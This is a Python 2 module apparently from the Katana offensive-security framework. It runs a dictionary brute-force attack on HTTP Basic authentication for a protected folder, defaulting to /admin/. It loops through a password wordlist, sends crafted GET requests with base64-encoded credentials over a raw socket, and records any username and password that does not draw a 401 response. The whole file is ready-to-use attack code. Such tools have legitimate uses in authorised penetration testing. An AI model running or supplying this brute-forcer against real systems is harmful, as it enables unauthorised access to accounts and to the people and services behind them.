# This module requires katana framework 
# https://github.com/RedToor/Katana
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core                 #
from core.design import *     #
from core.Setting import *    #
from core import Errors       #
from core import getFunction  #
import sys                    #
Message=DESIGN()              #
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Libraries                   #
import time                   #
import socket                 #
import base64                 #
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #

# INFORMATION MODULE
def initialize():
	initialize.Author             ="RedToor"
	initialize.Version            ="1.1"
	initialize.Despcription       ="Brute Force to HTTP folder block."
	initialize.CodeName           ="web/bt.http"
	initialize.DateCreation       ="27/02/2015"      
	initialize.LastModification   ="24/03/2016"

	# DEFAULT VARIABLES             VALUE                  NAME        RQ     DESCRIPTION
	initialize.DEFAULT_VARIABLE   =[[LOCAL_IP            , "target" , "yes" , "IP or DNS"]]         #[0][0]
	initialize.DEFAULT_VARIABLE  +=[[HTTP_PORT           , "port"   , "no"  , "Service port"]]      #[1][0]
	initialize.DEFAULT_VARIABLE  +=[["/admin/"           , "patch"  , "yes" , "File patch"]]        #[2][0]
	initialize.DEFAULT_VARIABLE  +=[[USERNAME            , "user"   , "yes" , "Username target"]]   #[3][0]
	initialize.DEFAULT_VARIABLE  +=[[DITIONARY_PASSWORDS , "dict"   , "no"  , "Wordlist"]]          #[4][0]
initialize()
# END INFORMATION MODULE

# MAIN FUNCTION
def main(run):
	try:
		# HEAD MODULE
		if run:	actions=raw_input(Message.prompt(initialize.CodeName))
		else  : actions="run"
		if   getFunction.KatanaCheckActionShowOptions(actions):getFunction.ShowOptions(initialize.DEFAULT_VARIABLE)
		elif getFunction.KatanaCheckActionSetValue(actions)   :initialize.DEFAULT_VARIABLE=getFunction.UpdateValue(actions,initialize.DEFAULT_VARIABLE)
		elif getFunction.KatanaCheckActionisBack(actions)     :return
		# END HEAD MODULE
		elif getFunction.runModule(actions):
			Message.run()
			# CODE MODULE    ############################################################################################
			try:
				getFunction.live(initialize.DEFAULT_VARIABLE[0][0],initialize.DEFAULT_VARIABLE[1][0])
				if True:
					red=socket.socket(socket.AF_INET, socket.SOCK_STREAM)      
					red.connect((initialize.DEFAULT_VARIABLE[0][0], int(initialize.DEFAULT_VARIABLE[1][0]))) 
					Message.loading_file()
					try:
						with open(initialize.DEFAULT_VARIABLE[4][0],'r') as passwords:
							for password in passwords:
								password=password.replace("\n","")
								red.send("GET                 "+initialize.DEFAULT_VARIABLE[2][0]+" HTTP/1.1\r\n")							
								red.send("HOST:               "+initialize.DEFAULT_VARIABLE[0][0]+"\r\n")							
								red.send("Authorization:Basic "+base64.b64encode(initialize.DEFAULT_VARIABLE[3][0]+":"+password)+"\r\n\r\n")  
								last=red.recv(1000)	
								if last.find("401")<=0:
									getFunction.savethree("BruteForceHTTP",initialize.DEFAULT_VARIABLE[0][0],initialize.DEFAULT_VARIABLE[1][0],initialize.DEFAULT_VARIABLE[2][0],initialize.DEFAULT_VARIABLE[3][0],password)
									Message.Success(initialize.DEFAULT_VARIABLE[3][0],password)
									red.close
									main(True)
								else:
									print " "+Alr+" Checking (username="+initialize.DEFAULT_VARIABLE[3][0]+")(password="+password+")"
									red.close
					except:
						Errors.Errors(event=sys.exc_info(), info=initialize.DEFAULT_VARIABLE[4][0])

			except:
				Errors.Errors(event=sys.exc_info(), info=initialize.DEFAULT_VARIABLE[0][0]+":"+initialize.DEFAULT_VARIABLE[1][0])
			# END CODE MODULE ############################################################################################
		elif getFunction.KatanaCheckActionisBack(actions): return
		else:
			getFunction.KatanaCheckActionGlobalCommands(actions)
	except:
		Errors.Errors(event=sys.exc_info(), info=sys.exc_traceback.tb_lineno)
	main(True)
# END MAIN FUNCTION

# LINKER FUNCTION
def run(target,port,patch,username,dictionary):
	initialize.DEFAULT_VARIABLE[0][0] = target
	initialize.DEFAULT_VARIABLE[1][0] = port
	initialize.DEFAULT_VARIABLE[2][0] = patch
	initialize.DEFAULT_VARIABLE[3][0] = username
	initialize.DEFAULT_VARIABLE[4][0] = dictionary
	main(False)
# END LINKER FUNCTION
